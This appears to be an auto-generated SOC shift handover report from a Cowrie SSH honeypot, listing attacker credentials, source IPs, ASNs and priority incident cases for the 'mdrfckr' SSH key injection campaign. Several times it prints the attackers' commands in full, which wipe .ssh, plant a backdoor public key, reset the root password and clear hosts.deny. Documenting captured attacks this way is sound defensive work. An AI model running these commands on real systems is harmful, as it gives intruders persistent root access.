# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-28 |
| **Generated At** | 2026-03-28T04:27:20Z |
| **Shift Time** | 04:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **100** |
| Confirmed Threats | **89** |
| False Positives Filtered | **11** (11.0%) |
| Unique Attacker IPs | **46** |
| Countries of Origin | **22** |
| High Severity Cases | **25** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **75** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **59** |
| Unique Credential Pairs | **38** |
| Unique Usernames | **19** |
| Unique Passwords | **37** |
| Successful Auth Pairs | **19** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 25 |
| `345gs5662d34` | 11 |
| `support` | 3 |
| `config` | 2 |
| `debian` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 11 |
| `p@ssw0rd` | 2 |
| `root1235` | 2 |
| `blank2014` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `root` | `3245gs5662d34` | 11 |
| `root1235` | `root1235` | 2 |
| `blank` | `blank2014` | 1 |
| `Unknown` | `uploader` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Asd123Asd` | `101.126.54.95` | 2026-03-28T02:35:58 |
| `root` | `151515` | `118.99.102.20` | 2026-03-28T03:03:05 |
| `root` | `3245gs5662d34` | `118.99.102.20` | 2026-03-28T03:03:09 |
| `root` | `8675309` | `101.47.161.42` | 2026-03-28T03:26:10 |
| `root` | `3245gs5662d34` | `101.47.161.42` | 2026-03-28T03:26:14 |
| `root` | `a159753` | `147.50.231.135` | 2026-03-28T03:29:14 |
| `root` | `3245gs5662d34` | `147.50.231.135` | 2026-03-28T03:29:17 |
| `root` | `Control123` | `147.50.231.135` | 2026-03-28T03:34:45 |
| `root` | `1q2w3e!@` | `147.50.231.135` | 2026-03-28T03:40:09 |
| `root` | `fifa` | `180.76.143.203` | 2026-03-28T03:41:48 |
| `root` | `3245gs5662d34` | `180.76.143.203` | 2026-03-28T03:41:58 |
| `root` | `a1s2d3f4g5` | `147.50.231.135` | 2026-03-28T03:45:27 |
| `root` | `4rfv5tgb6yhn` | `147.50.231.135` | 2026-03-28T03:50:45 |
| `root` | `priya123` | `62.60.244.109` | 2026-03-28T03:56:26 |
| `root` | `zhang1234` | `147.50.231.135` | 2026-03-28T03:56:27 |
| `root` | `3245gs5662d34` | `62.60.244.109` | 2026-03-28T03:56:30 |
| `root` | `Passw0rd$` | `147.50.231.135` | 2026-03-28T04:02:08 |
| `root` | `qwertyui` | `180.76.143.203` | 2026-03-28T04:03:46 |
| `root` | `2025.net` | `147.50.231.135` | 2026-03-28T04:07:29 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:lwuw6tD87xWk"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.54.95`, `147.50.231.135`, `180.76.143.203`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `62.60.244.109`, `101.47.161.42`, `147.50.231.135`, `118.99.102.20`, `180.76.143.203`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **46** |
| Unique ASNs | **32** |
| High-Risk ASNs | **27** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS3462` | Data Communication Business Group | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | LOW |
| `AS396982` | Google LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (25)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0a43b62f5877

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]95` |
| **First Seen** | 2026-03-28 02:35 |
| **Last Seen** | 2026-03-28 02:36 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:lwuw6tD87xWk"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 02:35:56` | `cowrie.session.connect` |
| `2026-03-28 02:35:56` | `cowrie.client.version` |
| `2026-03-28 02:35:56` | `cowrie.client.kex` |
| `2026-03-28 02:35:58` | `cowrie.login.success` |
| `2026-03-28 02:35:59` | `cowrie.session.params` |
| `2026-03-28 02:35:59` | `cowrie.command.input` |
| `2026-03-28 02:35:59` | `cowrie.command.failed` |
| `2026-03-28 02:35:59` | `cowrie.log.closed` |
| `2026-03-28 02:35:59` | `cowrie.session.params` |
| `2026-03-28 02:35:59` | `cowrie.command.input` |
| `2026-03-28 02:36:00` | `cowrie.session.file_download` |
| `2026-03-28 02:36:00` | `cowrie.log.closed` |
| `2026-03-28 02:36:16` | `cowrie.session.params` |
| `2026-03-28 02:36:16` | `cowrie.command.input` |
| `2026-03-28 02:36:16` | `cowrie.log.closed` |
| `2026-03-28 02:36:17` | `cowrie.session.params` |
| `2026-03-28 02:36:17` | `cowrie.command.input` |
| `2026-03-28 02:36:17` | `cowrie.log.closed` |
| `2026-03-28 02:36:18` | `cowrie.session.params` |
| `2026-03-28 02:36:18` | `cowrie.command.input` |
| `2026-03-28 02:36:18` | `cowrie.session.file_download` |
| `2026-03-28 02:36:18` | `cowrie.log.closed` |
| `2026-03-28 02:36:19` | `cowrie.session.params` |
| `2026-03-28 02:36:19` | `cowrie.command.input` |
| `2026-03-28 02:36:19` | `cowrie.log.closed` |
| `2026-03-28 02:36:20` | `cowrie.session.params` |
| `2026-03-28 02:36:20` | `cowrie.command.input` |
| `2026-03-28 02:36:20` | `cowrie.log.closed` |
| `2026-03-28 02:36:20` | `cowrie.session.params` |
| `2026-03-28 02:36:20` | `cowrie.command.input` |
| `2026-03-28 02:36:20` | `cowrie.command.input` |
| `2026-03-28 02:36:21` | `cowrie.log.closed` |
| `2026-03-28 02:36:22` | `cowrie.session.params` |
| `2026-03-28 02:36:22` | `cowrie.command.input` |
| `2026-03-28 02:36:22` | `cowrie.log.closed` |
| `2026-03-28 02:36:23` | `cowrie.session.params` |
| `2026-03-28 02:36:23` | `cowrie.command.input` |
| `2026-03-28 02:36:23` | `cowrie.log.closed` |
| `2026-03-28 02:36:24` | `cowrie.session.params` |
| `2026-03-28 02:36:24` | `cowrie.command.input` |
| `2026-03-28 02:36:24` | `cowrie.log.closed` |
| `2026-03-28 02:36:25` | `cowrie.session.params` |
| `2026-03-28 02:36:25` | `cowrie.command.input` |
| `2026-03-28 02:36:25` | `cowrie.log.closed` |
| `2026-03-28 02:36:26` | `cowrie.session.params` |
| `2026-03-28 02:36:26` | `cowrie.command.input` |
| `2026-03-28 02:36:26` | `cowrie.log.closed` |
| `2026-03-28 02:36:27` | `cowrie.session.params` |
| `2026-03-28 02:36:27` | `cowrie.command.input` |
| `2026-03-28 02:36:27` | `cowrie.log.closed` |
| `2026-03-28 02:36:28` | `cowrie.session.params` |
| `2026-03-28 02:36:28` | `cowrie.command.input` |
| `2026-03-28 02:36:28` | `cowrie.log.closed` |
| `2026-03-28 02:36:29` | `cowrie.session.params` |
| `2026-03-28 02:36:29` | `cowrie.command.input` |
| `2026-03-28 02:36:29` | `cowrie.log.closed` |
| `2026-03-28 02:36:30` | `cowrie.session.params` |
| `2026-03-28 02:36:30` | `cowrie.command.input` |
| `2026-03-28 02:36:30` | `cowrie.log.closed` |
| `2026-03-28 02:36:31` | `cowrie.session.params` |
| `2026-03-28 02:36:31` | `cowrie.command.input` |
| `2026-03-28 02:36:31` | `cowrie.log.closed` |
| `2026-03-28 02:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]95` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bade3e4c0c7

| Field | Detail |
|---|---|
| **Source IP** | `118.99.102[.]20` |
| **First Seen** | 2026-03-28 03:03 |
| **Last Seen** | 2026-03-28 03:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:03:04` | `cowrie.session.connect` |
| `2026-03-28 03:03:04` | `cowrie.client.version` |
| `2026-03-28 03:03:04` | `cowrie.client.kex` |
| `2026-03-28 03:03:05` | `cowrie.login.success` |
| `2026-03-28 03:03:06` | `cowrie.session.params` |
| `2026-03-28 03:03:06` | `cowrie.command.input` |
| `2026-03-28 03:03:06` | `cowrie.command.failed` |
| `2026-03-28 03:03:06` | `cowrie.log.closed` |
| `2026-03-28 03:03:06` | `cowrie.session.params` |
| `2026-03-28 03:03:06` | `cowrie.command.input` |
| `2026-03-28 03:03:06` | `cowrie.session.file_download` |
| `2026-03-28 03:03:06` | `cowrie.log.closed` |
| `2026-03-28 03:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.102[.]20` to AbuseIPDB if not already reported
- [ ] Block `118.99.102[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ee5b8bbf30c

| Field | Detail |
|---|---|
| **Source IP** | `118.99.102[.]20` |
| **First Seen** | 2026-03-28 03:03 |
| **Last Seen** | 2026-03-28 03:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:03:09` | `cowrie.session.connect` |
| `2026-03-28 03:03:09` | `cowrie.client.version` |
| `2026-03-28 03:03:09` | `cowrie.client.kex` |
| `2026-03-28 03:03:09` | `cowrie.login.success` |
| `2026-03-28 03:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.102[.]20` to AbuseIPDB if not already reported
- [ ] Block `118.99.102[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d316f42c3f0

| Field | Detail |
|---|---|
| **Source IP** | `101.47.161[.]42` |
| **First Seen** | 2026-03-28 03:26 |
| **Last Seen** | 2026-03-28 03:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:26:09` | `cowrie.session.connect` |
| `2026-03-28 03:26:09` | `cowrie.client.version` |
| `2026-03-28 03:26:09` | `cowrie.client.kex` |
| `2026-03-28 03:26:10` | `cowrie.login.success` |
| `2026-03-28 03:26:10` | `cowrie.session.params` |
| `2026-03-28 03:26:10` | `cowrie.command.input` |
| `2026-03-28 03:26:10` | `cowrie.command.failed` |
| `2026-03-28 03:26:10` | `cowrie.log.closed` |
| `2026-03-28 03:26:11` | `cowrie.session.params` |
| `2026-03-28 03:26:11` | `cowrie.command.input` |
| `2026-03-28 03:26:11` | `cowrie.session.file_download` |
| `2026-03-28 03:26:11` | `cowrie.log.closed` |
| `2026-03-28 03:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.161[.]42` to AbuseIPDB if not already reported
- [ ] Block `101.47.161[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-409badc37c1d

| Field | Detail |
|---|---|
| **Source IP** | `101.47.161[.]42` |
| **First Seen** | 2026-03-28 03:26 |
| **Last Seen** | 2026-03-28 03:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:26:13` | `cowrie.session.connect` |
| `2026-03-28 03:26:13` | `cowrie.client.version` |
| `2026-03-28 03:26:13` | `cowrie.client.kex` |
| `2026-03-28 03:26:14` | `cowrie.login.success` |
| `2026-03-28 03:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.161[.]42` to AbuseIPDB if not already reported
- [ ] Block `101.47.161[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e08351887480

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 03:29 |
| **Last Seen** | 2026-03-28 03:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:29:13` | `cowrie.session.connect` |
| `2026-03-28 03:29:13` | `cowrie.client.version` |
| `2026-03-28 03:29:14` | `cowrie.client.kex` |
| `2026-03-28 03:29:14` | `cowrie.login.success` |
| `2026-03-28 03:29:14` | `cowrie.session.params` |
| `2026-03-28 03:29:14` | `cowrie.command.input` |
| `2026-03-28 03:29:14` | `cowrie.command.failed` |
| `2026-03-28 03:29:14` | `cowrie.log.closed` |
| `2026-03-28 03:29:15` | `cowrie.session.params` |
| `2026-03-28 03:29:15` | `cowrie.command.input` |
| `2026-03-28 03:29:15` | `cowrie.session.file_download` |
| `2026-03-28 03:29:15` | `cowrie.log.closed` |
| `2026-03-28 03:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-844a62ba3c62

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 03:29 |
| **Last Seen** | 2026-03-28 03:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:29:16` | `cowrie.session.connect` |
| `2026-03-28 03:29:16` | `cowrie.client.version` |
| `2026-03-28 03:29:16` | `cowrie.client.kex` |
| `2026-03-28 03:29:17` | `cowrie.login.success` |
| `2026-03-28 03:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80725ccc5d39

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 03:34 |
| **Last Seen** | 2026-03-28 03:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:34:45` | `cowrie.session.connect` |
| `2026-03-28 03:34:45` | `cowrie.client.version` |
| `2026-03-28 03:34:45` | `cowrie.client.kex` |
| `2026-03-28 03:34:45` | `cowrie.login.success` |
| `2026-03-28 03:34:45` | `cowrie.session.params` |
| `2026-03-28 03:34:45` | `cowrie.command.input` |
| `2026-03-28 03:34:45` | `cowrie.command.failed` |
| `2026-03-28 03:34:46` | `cowrie.log.closed` |
| `2026-03-28 03:34:46` | `cowrie.session.params` |
| `2026-03-28 03:34:46` | `cowrie.command.input` |
| `2026-03-28 03:34:46` | `cowrie.session.file_download` |
| `2026-03-28 03:34:46` | `cowrie.log.closed` |
| `2026-03-28 03:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff14bff9ae7

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 03:34 |
| **Last Seen** | 2026-03-28 03:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:34:48` | `cowrie.session.connect` |
| `2026-03-28 03:34:48` | `cowrie.client.version` |
| `2026-03-28 03:34:48` | `cowrie.client.kex` |
| `2026-03-28 03:34:48` | `cowrie.login.success` |
| `2026-03-28 03:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdbb5639a189

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 03:40 |
| **Last Seen** | 2026-03-28 03:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:40:08` | `cowrie.session.connect` |
| `2026-03-28 03:40:08` | `cowrie.client.version` |
| `2026-03-28 03:40:08` | `cowrie.client.kex` |
| `2026-03-28 03:40:09` | `cowrie.login.success` |
| `2026-03-28 03:40:09` | `cowrie.session.params` |
| `2026-03-28 03:40:09` | `cowrie.command.input` |
| `2026-03-28 03:40:09` | `cowrie.command.failed` |
| `2026-03-28 03:40:09` | `cowrie.log.closed` |
| `2026-03-28 03:40:09` | `cowrie.session.params` |
| `2026-03-28 03:40:09` | `cowrie.command.input` |
| `2026-03-28 03:40:09` | `cowrie.session.file_download` |
| `2026-03-28 03:40:09` | `cowrie.log.closed` |
| `2026-03-28 03:40:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
